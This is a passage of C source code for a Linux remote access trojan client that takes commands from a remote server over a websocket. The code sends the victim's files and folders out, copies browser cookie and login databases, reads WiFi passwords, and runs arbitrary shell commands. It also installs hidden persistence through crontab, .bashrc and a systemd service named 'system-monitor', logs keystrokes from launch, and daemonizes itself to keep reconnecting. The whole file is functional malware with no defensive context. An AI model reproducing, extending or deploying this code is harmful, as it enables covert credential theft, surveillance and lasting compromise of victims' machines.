        snprintf(msg, sizeof(msg), "[!] Cannot open file: %s\n", filename);
        send_websocket_data(msg, strlen(msg));
        return;
    }
    
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size <= 0) {
        fclose(f);
        send_websocket_data("[!] File is empty\n", 18);
        return;
    }
    
    if (file_size > 100 * 1024 * 1024) {  // 100MB limit
        fclose(f);
        send_websocket_data("[!] File too large (>100MB)\n", 28);
        return;
    }
    
    unsigned char* data = malloc(file_size);
    if (!data) {
        fclose(f);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    fread(data, 1, file_size, f);
    fclose(f);
    
    // Get just the filename
    const char* basename = strrchr(filename, '/');
    basename = basename ? basename + 1 : filename;
    
    // Base64 encode
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = malloc(b64_size);
    if (!b64_data) {
        free(data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    base64_encode(data, file_size, b64_data);
    free(data);
    
    // Send header
    char header[512];
    snprintf(header, sizeof(header), "<<<FILE_START>>>%s|%ld<<<DATA>>>", basename, file_size);
    send_websocket_data(header, strlen(header));
    
    // Send data in chunks
    int b64_len = strlen(b64_data);
    int sent = 0;
    int chunk_size = 4096;
    
    while (sent < b64_len && g_connected) {
        int to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        send_websocket_data(b64_data + sent, to_send);
        sent += to_send;
        usleep(10000);
    }
    
    free(b64_data);
    
    send_websocket_data("<<<FILE_END>>>", 14);
    
    char msg[512];
    snprintf(msg, sizeof(msg), "\n[+] File sent: %s (%ld bytes)\n", basename, file_size);
    send_websocket_data(msg, strlen(msg));
}

// ============== FOLDER DOWNLOAD ==============
void download_folder(const char* foldername) {
    // Clean path
    char clean_name[4096];
    const char* start = foldername;
    while (*start == ' ' || *start == '\t') start++;
    strncpy(clean_name, start, sizeof(clean_name) - 1);
    clean_name[sizeof(clean_name) - 1] = '\0';
    int len = strlen(clean_name);
    while (len > 0 && (clean_name[len-1] == ' ' || clean_name[len-1] == '\t' ||
                       clean_name[len-1] == '/')) {
        clean_name[--len] = '\0';
    }
    
    // Check if directory exists
    struct stat st;
    if (stat(clean_name, &st) != 0 || !S_ISDIR(st.st_mode)) {
        send_websocket_data("[!] Folder not found\n", 21);
        return;
    }
    
    send_websocket_data("[*] Compressing folder...\n", 26);
    
    // Create temp zip file
    char temp_zip[256];
    snprintf(temp_zip, sizeof(temp_zip), "/tmp/.folder_%d.tar.gz", getpid());
    
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "tar -czf '%s' -C '%s' . 2>/dev/null", temp_zip, clean_name);
    int ret = system(cmd);
    
    if (ret != 0 || access(temp_zip, R_OK) != 0) {
        send_websocket_data("[!] Failed to compress folder\n", 30);
        return;
    }
    
    download_file(temp_zip);
    unlink(temp_zip);
}

// ============== BROWSER CREDENTIAL EXTRACTION ==============
void extract_browser_creds() {
    send_websocket_data("\n[*] Extracting browser credentials and passwords...\n", 54);
    send_websocket_data("[*] Saving extracted data to loot/downloads folder...\n", 54);
    
    // Create loot/downloads directory
    system("mkdir -p loot/downloads 2>/dev/null");
    
    char* home = getenv("HOME");
    if (!home) {
        send_websocket_data("[!] Cannot get HOME directory\n", 30);
        return;
    }
    
    char msg[4096];
    time_t now = time(NULL);
    struct tm* timeinfo = localtime(&now);
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", timeinfo);
    
    char loot_file[512];
    snprintf(loot_file, sizeof(loot_file), "loot/downloads/browser_creds_%s.txt", timestamp);
    FILE* loot_fp = fopen(loot_file, "w");
    
    // Chrome / Chromium cookies and login data
    char chrome_path[512];
    snprintf(chrome_path, sizeof(chrome_path), "%s/.config/google-chrome/Default", home);
    if (access(chrome_path, F_OK) == 0) {
        snprintf(msg, sizeof(msg), "\n=== CHROME DATA FOUND ===\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
        
        // Copy Chrome Cookies database
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "cp '%s/Cookies' 'loot/downloads/chrome_cookies.db' 2>/dev/null", chrome_path);
        system(cmd);
        snprintf(msg, sizeof(msg), "[+] Saved: loot/downloads/chrome_cookies.db\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
        
        // Copy Chrome Login Data
        snprintf(cmd, sizeof(cmd), "cp '%s/Login Data' 'loot/downloads/chrome_login.db' 2>/dev/null", chrome_path);
        system(cmd);
        snprintf(msg, sizeof(msg), "[+] Saved: loot/downloads/chrome_login.db (passwords encrypted)\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
    }
    
    // Chromium
    char chromium_path[512];
    snprintf(chromium_path, sizeof(chromium_path), "%s/.config/chromium/Default", home);
    if (access(chromium_path, F_OK) == 0) {
        snprintf(msg, sizeof(msg), "\n=== CHROMIUM DATA FOUND ===\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
        
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "cp '%s/Cookies' 'loot/downloads/chromium_cookies.db' 2>/dev/null", chromium_path);
        system(cmd);
        snprintf(msg, sizeof(msg), "[+] Saved: loot/downloads/chromium_cookies.db\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
    }
    
    // Firefox
    char ff_path[512];
    snprintf(ff_path, sizeof(ff_path), "%s/.mozilla/firefox", home);
    if (access(ff_path, F_OK) == 0) {
        snprintf(msg, sizeof(msg), "\n=== FIREFOX PROFILES FOUND ===\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
        
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "find '%s' -name '*.default*' -type d 2>/dev/null", ff_path);
        FILE* fp = popen(cmd, "r");
        if (fp) {
            char profile[512];
            int profile_num = 0;
            while (fgets(profile, sizeof(profile), fp)) {
                profile[strcspn(profile, "\n")] = 0;
                snprintf(msg, sizeof(msg), "Profile: %s\n", profile);
                send_websocket_data(msg, strlen(msg));
                if (loot_fp) fprintf(loot_fp, "%s", msg);
                
                // Copy cookies.sqlite
                char cookies[1024];
                snprintf(cookies, sizeof(cookies), "%s/cookies.sqlite", profile);
                if (access(cookies, R_OK) == 0) {
                    snprintf(cmd, sizeof(cmd), "cp '%s' 'loot/downloads/firefox_cookies_%d.db' 2>/dev/null", cookies, profile_num);
                    system(cmd);
                    snprintf(msg, sizeof(msg), "  [+] Saved: loot/downloads/firefox_cookies_%d.db\n", profile_num);
                    send_websocket_data(msg, strlen(msg));
                    if (loot_fp) fprintf(loot_fp, "%s", msg);
                }
                
                // Copy logins.json
                char logins[1024];
                snprintf(logins, sizeof(logins), "%s/logins.json", profile);
                if (access(logins, R_OK) == 0) {
                    snprintf(cmd, sizeof(cmd), "cp '%s' 'loot/downloads/firefox_logins_%d.json' 2>/dev/null", logins, profile_num);
                    system(cmd);
                    snprintf(msg, sizeof(msg), "  [+] Saved: loot/downloads/firefox_logins_%d.json\n", profile_num);
                    send_websocket_data(msg, strlen(msg));
                    if (loot_fp) fprintf(loot_fp, "%s", msg);
                }
                
                profile_num++;
            }
            pclose(fp);
        }
    }
    
    // WiFi passwords (requires root)
    send_websocket_data("\n=== WIFI PASSWORDS ===\n", 24);
    if (loot_fp) fprintf(loot_fp, "\n=== WIFI PASSWORDS ===\n");
    
    if (geteuid() == 0) {
        FILE* fp = popen("find /etc/NetworkManager/system-connections -name '*.nmconnection' 2>/dev/null -exec grep -H 'psk=' {} \\;", "r");
        if (fp) {
            char line[512];
            while (fgets(line, sizeof(line), fp)) {
                send_websocket_data(line, strlen(line));
                if (loot_fp) fprintf(loot_fp, "%s", line);
            }
            pclose(fp);
        }
        
        // Also try wpa_supplicant config
        FILE* wpa_fp = fopen("/etc/wpa_supplicant/wpa_supplicant.conf", "r");
        if (wpa_fp) {
            char line[512];
            while (fgets(line, sizeof(line), wpa_fp)) {
                if (strstr(line, "psk=") || strstr(line, "ssid=")) {
                    send_websocket_data(line, strlen(line));
                    if (loot_fp) fprintf(loot_fp, "%s", line);
                }
            }
            fclose(wpa_fp);
        }
        
        snprintf(msg, sizeof(msg), "[+] Saved: loot/downloads/wifi_passwords.txt\n");
        send_websocket_data(msg, strlen(msg));
        if (loot_fp) fprintf(loot_fp, "%s", msg);
    } else {
        send_websocket_data("(Requires root access for WiFi passwords)\n", 42);
        if (loot_fp) fprintf(loot_fp, "(Requires root access for WiFi passwords)\n");
    }
    
    if (loot_fp) {
        fprintf(loot_fp, "\n[+] Extraction complete\n");
        fclose(loot_fp);
    }
    
    snprintf(msg, sizeof(msg), "\n[+] Browser credentials and passwords extraction complete\n");
    send_websocket_data(msg, strlen(msg));
    snprintf(msg, sizeof(msg), "[*] Check loot/downloads folder for extracted data\n\n");
    send_websocket_data(msg, strlen(msg));
}

// ============== COMMAND EXECUTION ==============
void execute_command(const char* cmd) {
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        send_websocket_data("[!] Command execution failed\n", 29);
        return;
    }
    
    char output[4096];
    while (fgets(output, sizeof(output), fp) != NULL) {
        send_websocket_data(output, strlen(output));
    }
    
    pclose(fp);
}

// ============== SYSTEM INFO ==============
void send_sysinfo() {
    char info[4096];
    struct utsname uts;
    uname(&uts);
    
    // Get memory info
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    long total_mem = (pages * page_size) / (1024 * 1024);
    
    snprintf(info, sizeof(info),
        "\n=== System Information ===\n"
        "Hostname: %s\n"
        "Username: %s\n"
        "ClientID: %s\n"
        "OS: %s %s\n"
        "Kernel: %s\n"
        "Architecture: %s\n"
        "Total RAM: %ld MB\n"
        "Current Dir: %s\n"
        "Shell: %s\n"
        "===========================\n\n",
        g_hostname,
        g_username,
        g_client_id,
        uts.sysname, uts.release,
        uts.version,
        uts.machine,
        total_mem,
        g_current_dir,
        getenv("SHELL") ? getenv("SHELL") : "/bin/sh"
    );
    
    send_websocket_data(info, strlen(info));
}

// ============== PERSISTENCE ==============
void enable_persistence() {
    char exe_path[4096];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        send_websocket_data("[!] Failed to get executable path\n", 34);
        return;
    }
    exe_path[len] = '\0';
    
    // Copy to hidden location
    char* home = getenv("HOME");
    if (!home) {
        send_websocket_data("[!] Cannot get HOME directory\n", 30);
        return;
    }
    
    char hidden_dir[4096];
    char hidden_exe[4096];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s/.config/systemd", home);
    snprintf(hidden_exe, sizeof(hidden_exe), "%s/.config/systemd/system-monitor", home);
    
    // Create directory
    mkdir(hidden_dir, 0755);
    
    // Copy executable
    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s' 2>/dev/null", exe_path, hidden_exe);
    system(cmd);
    chmod(hidden_exe, 0755);
    
    // Add to crontab
    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null | grep -v 'system-monitor'; echo '@reboot %s') | crontab -", hidden_exe);
    system(cmd);
    
    // Add to .bashrc
    char bashrc[4096];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);
    FILE* f = fopen(bashrc, "a");
    if (f) {
        fprintf(f, "\n# System monitor\n(pgrep -f system-monitor || %s &) >/dev/null 2>&1\n", hidden_exe);
        fclose(f);
    }
    
    // Create systemd user service
    char service_dir[4096];
    char service_file[4096];
    snprintf(service_dir, sizeof(service_dir), "%s/.config/systemd/user", home);
    snprintf(service_file, sizeof(service_file), "%s/system-monitor.service", service_dir);
    
    snprintf(cmd, sizeof(cmd), "mkdir -p '%s'", service_dir);
    system(cmd);
    
    f = fopen(service_file, "w");
    if (f) {
        fprintf(f,
            "[Unit]\n"
            "Description=System Monitor Service\n"
            "After=network.target\n\n"
            "[Service]\n"
            "Type=simple\n"
            "ExecStart=%s\n"
            "Restart=always\n"
            "RestartSec=10\n\n"
            "[Install]\n"
            "WantedBy=default.target\n",
            hidden_exe
        );
        fclose(f);
        
        system("systemctl --user daemon-reload 2>/dev/null");
        system("systemctl --user enable system-monitor 2>/dev/null");
    }
    
    send_websocket_data("[+] Persistence installed:\n", 27);
    send_websocket_data("[+] - Crontab entry added\n", 26);
    send_websocket_data("[+] - .bashrc entry added\n", 26);
    send_websocket_data("[+] - Systemd user service created\n", 35);
}

void disable_persistence() {
    char* home = getenv("HOME");
    if (!home) return;
    
    // Remove from crontab
    system("crontab -l 2>/dev/null | grep -v 'system-monitor' | crontab -");
    
    // Remove systemd service
    system("systemctl --user stop system-monitor 2>/dev/null");
    system("systemctl --user disable system-monitor 2>/dev/null");
    
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "rm -f '%s/.config/systemd/user/system-monitor.service'", home);
    system(cmd);
    
    // Remove executable
    snprintf(cmd, sizeof(cmd), "rm -f '%s/.config/systemd/system-monitor'", home);
    system(cmd);
    
    // Note: .bashrc entry needs manual removal
    
    send_websocket_data("[+] Persistence removed (check .bashrc manually)\n", 49);
}

// ============== INPUT LOGGER ==============
void* inputlog_thread_func(void* arg) {
    // Linux keylogging requires root or input group membership
    // Try /dev/input/event* devices
    
    // Find keyboard device
    char device[256] = "";
    FILE* f = popen("grep -l 'keyboard' /sys/class/input/event*/device/name 2>/dev/null | head -1", "r");
    if (f) {
        char path[256];
        if (fgets(path, sizeof(path), f)) {
            path[strcspn(path, "\n")] = 0;
            // Extract event number
            char* event = strstr(path, "event");
            if (event) {
                char* end = strchr(event, '/');
                if (end) *end = 0;
                snprintf(device, sizeof(device), "/dev/input/%s", event);
            }
        }
        pclose(f);
    }
    
    if (strlen(device) == 0) {
        // Try common devices
        if (access("/dev/input/event0", R_OK) == 0) {
            strcpy(device, "/dev/input/event0");
        } else {
            return NULL;  // No access to input devices
        }
    }
    
    int fd = open(device, O_RDONLY);
    if (fd < 0) {
        return NULL;  // Need root or input group
    }
    
    // Open log file
    FILE* logfile = fopen(g_inputlog_path, "a");
    if (!logfile) {
        close(fd);
        return NULL;
    }
    
    fprintf(logfile, "\n========== Input Log Started ==========\n");
    fclose(logfile);
    
    struct input_event {
        struct timeval time;
        unsigned short type;
        unsigned short code;
        unsigned int value;
    } ev;
    
    while (g_inputlog_running && g_connected) {
        if (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
            if (ev.type == 1 && ev.value == 1) {  // Key press
                logfile = fopen(g_inputlog_path, "a");
                if (logfile) {
                    fprintf(logfile, "[%d]", ev.code);
                    fclose(logfile);
                }
            }
        }
    }
    
    close(fd);
    return NULL;
}

void start_inputlog() {
    if (g_inputlog_running) return;
    
    char* home = getenv("HOME");
    if (home) {
        snprintf(g_inputlog_path, sizeof(g_inputlog_path), "%s/.cache/.inputlog", home);
    } else {
        strcpy(g_inputlog_path, "/tmp/.inputlog");
    }
    
    g_inputlog_running = 1;
    pthread_create(&g_inputlog_thread, NULL, inputlog_thread_func, NULL);
    
    send_websocket_data("[*] Input logger started (requires root/input group)\n", 53);
}

void stop_inputlog() {
    if (!g_inputlog_running) return;
    
    g_inputlog_running = 0;
    pthread_join(g_inputlog_thread, NULL);
    
    send_websocket_data("[+] Input logger stopped\n", 25);
}

// ============== COMMAND HANDLER ==============
void handle_command(const char* cmd) {
    // Trim whitespace
    while (*cmd == ' ' || *cmd == '\t') cmd++;
    char clean_cmd[4096];
    strncpy(clean_cmd, cmd, sizeof(clean_cmd) - 1);
    clean_cmd[sizeof(clean_cmd) - 1] = '\0';
    
    int len = strlen(clean_cmd);
    while (len > 0 && (clean_cmd[len-1] == '\n' || clean_cmd[len-1] == '\r' || clean_cmd[len-1] == ' ')) {
        clean_cmd[--len] = '\0';
    }
    
    if (len == 0) return;
    
    if (strcmp(clean_cmd, "screenshot") == 0) {
        take_screenshot();
    }
    else if (strcmp(clean_cmd, "shell") == 0) {
        shell_session();
    }
    else if (strcmp(clean_cmd, "ps") == 0) {
        list_processes();
    }
    else if (strncmp(clean_cmd, "download ", 9) == 0) {
        download_file(clean_cmd + 9);
    }
    else if (strncmp(clean_cmd, "downloadfolder ", 15) == 0 || strncmp(clean_cmd, "dldir ", 6) == 0) {
        char* path = (strncmp(clean_cmd, "downloadfolder ", 15) == 0) ? (char*)clean_cmd + 15 : (char*)clean_cmd + 6;
        download_folder(path);
    }
    else if (strcmp(clean_cmd, "browsercreds") == 0 || strcmp(clean_cmd, "getcreds") == 0) {
        extract_browser_creds();
    }
    else if (strncmp(clean_cmd, "cmd ", 4) == 0) {
        execute_command(clean_cmd + 4);
    }
    else if (strncmp(clean_cmd, "cd ", 3) == 0) {
        if (chdir(clean_cmd + 3) == 0) {
            getcwd(g_current_dir, sizeof(g_current_dir));
            char msg[4096];
            snprintf(msg, sizeof(msg), "[+] Changed to: %s\n", g_current_dir);
            send_websocket_data(msg, strlen(msg));
        } else {
            send_websocket_data("[!] Directory change failed\n", 28);
        }
    }
    else if (strcmp(clean_cmd, "pwd") == 0) {
        char msg[4096];
        snprintf(msg, sizeof(msg), "%s\n", g_current_dir);
        send_websocket_data(msg, strlen(msg));
    }
    else if (strcmp(clean_cmd, "sysinfo") == 0) {
        send_sysinfo();
    }
    else if (strcmp(clean_cmd, "listcam") == 0 || strcmp(clean_cmd, "listcams") == 0 || strcmp(clean_cmd, "cameras") == 0) {
        list_cameras();
    }
    else if (strncmp(clean_cmd, "selectcam ", 10) == 0 || strncmp(clean_cmd, "usecam ", 7) == 0) {
        int index = 0;
        char* params = (strncmp(clean_cmd, "selectcam ", 10) == 0) ? (char*)clean_cmd + 10 : (char*)clean_cmd + 7;
        while (*params == ' ') params++;
        if (*params) {
            sscanf(params, "%d", &index);
        }
        select_camera(index);
    }
    else if (strcmp(clean_cmd, "camshot") == 0 || strcmp(clean_cmd, "camsnap") == 0) {
        take_camshot();
    }
    // Live view commands
    else if (strncmp(clean_cmd, "liveview", 8) == 0 || strncmp(clean_cmd, "screenshare", 11) == 0) {
        int fps = g_liveview_fps;
        int quality = g_liveview_quality;
        char* params = strchr(clean_cmd, ' ');
        if (params) {
            while (*params == ' ') params++;
            if (*params) {
                sscanf(params, "%d %d", &fps, &quality);
                if (fps < 1) fps = 1;
                if (fps > 60) fps = 60;
                if (quality < 10) quality = 10;
                if (quality > 100) quality = 100;
            }
        }
        // Send defaults acknowledgment
        char default_msg[256];
        snprintf(default_msg, sizeof(default_msg), "[+] Liveview parameters: %d FPS, %d%% quality\n", fps, quality);
        send_websocket_data(default_msg, strlen(default_msg));
        start_liveview(fps, quality);
    }
    else if (strcmp(clean_cmd, "stoplive") == 0 || strcmp(clean_cmd, "stopscreen") == 0) {
        stop_liveview();
    }
    // Camera view commands
    else if (strncmp(clean_cmd, "camview", 7) == 0 || strncmp(clean_cmd, "webcamview", 10) == 0) {
        int fps = g_camview_fps;
        int quality = g_camview_quality;
        char* params = strchr(clean_cmd, ' ');
        if (params) {
            while (*params == ' ') params++;
            sscanf(params, "%d %d", &fps, &quality);
        }
        start_camview(fps, quality);
    }
    else if (strcmp(clean_cmd, "stopcam") == 0 || strcmp(clean_cmd, "stopcamview") == 0) {
        stop_camview();
    }
    // Live audio commands
    else if (strncmp(clean_cmd, "liveaudio", 9) == 0 || strncmp(clean_cmd, "livemic", 7) == 0) {
        int samplerate = g_liveaudio_samplerate;
        char* params = strchr(clean_cmd, ' ');
        if (params) {
            while (*params == ' ') params++;
            if (*params) {
                sscanf(params, "%d", &samplerate);
                if (samplerate < 8000) samplerate = 8000;
                if (samplerate > 48000) samplerate = 48000;
            }
        }
        // Send defaults acknowledgment
        char default_msg[256];
        snprintf(default_msg, sizeof(default_msg), "[+] Live audio parameters: %d Hz (mono)\n", samplerate);
        send_websocket_data(default_msg, strlen(default_msg));
        start_liveaudio(samplerate);
    }
    else if (strcmp(clean_cmd, "stopaudio") == 0 || strcmp(clean_cmd, "stopmic") == 0) {
        stop_liveaudio();
    }
    else if (strcmp(clean_cmd, "keylogs") == 0) {
        if (strlen(g_inputlog_path) > 0 && access(g_inputlog_path, R_OK) == 0) {
            download_file(g_inputlog_path);
        } else {
            send_websocket_data("[!] No input log available\n", 27);
        }
    }
    else if (strcmp(clean_cmd, "clearlogs") == 0) {
        if (strlen(g_inputlog_path) > 0) {
            FILE* f = fopen(g_inputlog_path, "w");
            if (f) {
                fclose(f);
                send_websocket_data("[+] Logs cleared\n", 17);
            }
        }
    }
    else if (strcmp(clean_cmd, "persist") == 0) {
        enable_persistence();
    }
    else if (strcmp(clean_cmd, "unpersist") == 0) {
        disable_persistence();
    }
    else if (strcmp(clean_cmd, "exit") == 0) {
        send_websocket_data("[*] Exiting...\n", 15);
        g_should_exit = 1;
    }
    else if (strcmp(clean_cmd, "help") == 0) {
        char* help = 
            "\n=============== Available Commands (Linux) ===============\n\n"
            "== Screen & Camera ==\n"
            "  screenshot           - Take high quality screenshot\n"
            "  liveview [fps] [q]   - Live screen stream (default: 30fps, 80%)\n"
            "  stoplive             - Stop live screen stream\n"
            "  listcam              - List available cameras\n"
            "  selectcam <n>        - Select camera by index\n"
            "  camshot              - Take camera photo\n"
            "  camview [fps] [q]    - Live camera stream (default: 15fps, 70%)\n"
            "  stopcam              - Stop live camera stream\n\n"
            "== Audio ==\n"
            "  liveaudio [rate]     - Live audio stream (default: 22050 Hz)\n"
            "  stopaudio            - Stop live audio stream\n\n"
            "== System ==\n"
            "  shell                - Interactive shell session\n"
            "  ps                   - List running processes\n"
            "  cmd <command>        - Execute single command\n"
            "  cd <path>            - Change directory\n"
            "  pwd                  - Print current directory\n"
            "  sysinfo              - Show system information\n\n"
            "== Files ==\n"
            "  download <file>      - Download file from client\n"
            "  downloadfolder <path>- Download entire folder as tar.gz\n\n"
            "== Credential Extraction ==\n"
            "  browsercreds         - Extract browser data & WiFi passwords\n\n"
            "== Keylogger ==\n"
            "  keylogs              - Download keylog file\n"
            "  clearlogs            - Clear keylog file\n\n"
            "== Persistence ==\n"
            "  persist              - Install persistence\n"
            "  unpersist            - Remove persistence\n\n"
            "== Session ==\n"
            "  exit                 - Exit session (client reconnects)\n"
            "  help                 - Show this help\n"
            "============================================================\n\n";
        send_websocket_data(help, strlen(help));
    }
    else {
        char msg[512];
        snprintf(msg, sizeof(msg), "[!] Unknown command: '%s'. Type 'help' for commands.\n", clean_cmd);
        send_websocket_data(msg, strlen(msg));
    }
}

// ============== SESSION HANDLER ==============
void handle_session() {
    char buffer[BUFFER_SIZE];
    char recv_buffer[BUFFER_SIZE * 2];
    int recv_buffer_len = 0;
    
    // Start ping thread
    g_ping_running = 1;
    pthread_create(&g_ping_thread, NULL, ping_thread_func, NULL);
    
    // Send connection info
    struct utsname uts;
    uname(&uts);
    
    char connect_msg[1024];
    snprintf(connect_msg, sizeof(connect_msg),
        "\n[+] Linux Client Connected\n"
        "[+] Host: %s | User: %s\n"
        "[+] ClientID: %s\n"
        "[+] OS: %s %s (%s)\n"
        "[+] Directory: %s\n\n",
        g_hostname, g_username, g_client_id,
        uts.sysname, uts.release, uts.machine,
        g_current_dir
    );
    send_websocket_data(connect_msg, strlen(connect_msg));
    
    // AUTO-START SCREEN RECORDING ON SESSION INIT
    send_websocket_data("[*] Auto-starting screen recording...\n", 38);
    // Note: Linux recording via ffmpeg can be started here if needed
    
    // Main receive loop
    while (g_connected && !g_should_exit) {
        fd_set readfds;
        struct timeval tv;
        
        FD_ZERO(&readfds);
        FD_SET(g_sock, &readfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int ret = select(g_sock + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) {
            break;
        }
        
        if (ret == 0) continue;  // Timeout
        
        if (FD_ISSET(g_sock, &readfds)) {
            int len = recv(g_sock, buffer, sizeof(buffer) - 1, 0);
            if (len <= 0) {
                g_connected = 0;
                break;
            }
            
            // Add to receive buffer
            if (recv_buffer_len + len < sizeof(recv_buffer)) {
                memcpy(recv_buffer + recv_buffer_len, buffer, len);
                recv_buffer_len += len;
            }
            
            // Try to parse WebSocket frames
            while (recv_buffer_len > 0) {
                char output[BUFFER_SIZE];
                int output_len;
                
                int consumed = parse_websocket_frame((unsigned char*)recv_buffer, recv_buffer_len, output, &output_len);
                if (consumed <= 0) break;
                
                // Remove consumed data from buffer
                memmove(recv_buffer, recv_buffer + consumed, recv_buffer_len - consumed);
                recv_buffer_len -= consumed;
                
                if (output_len > 0) {
                    handle_command(output);
                }
            }
        }
    }
    
    // Stop ping thread
    g_ping_running = 0;
    pthread_join(g_ping_thread, NULL);
}

// ============== MAIN ==============
int main(int argc, char* argv[]) {
    // Ignore SIGPIPE
    signal(SIGPIPE, SIG_IGN);
    
    // Daemonize (run in background)
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    
    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Get system info
    gethostname(g_hostname, sizeof(g_hostname));
    
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        strncpy(g_username, pw->pw_name, sizeof(g_username) - 1);
    } else {
        strcpy(g_username, "unknown");
    }
    
    getcwd(g_current_dir, sizeof(g_current_dir));
    
    g_session_id = getpid() ^ time(NULL);
    
    // Initialize unique client ID
    init_client_id();
    
    // Try to start input logger
    start_inputlog();
    
    // Main connection loop
    while (1) {
        g_connected = 0;
        g_should_exit = 0;
        
        while (!g_connected) {
            if (connect_to_server()) {
                handle_session();
                cleanup_socket();
            }
            
            sleep(RECONNECT_DELAY);
        }
    }
    
    return 0;
}
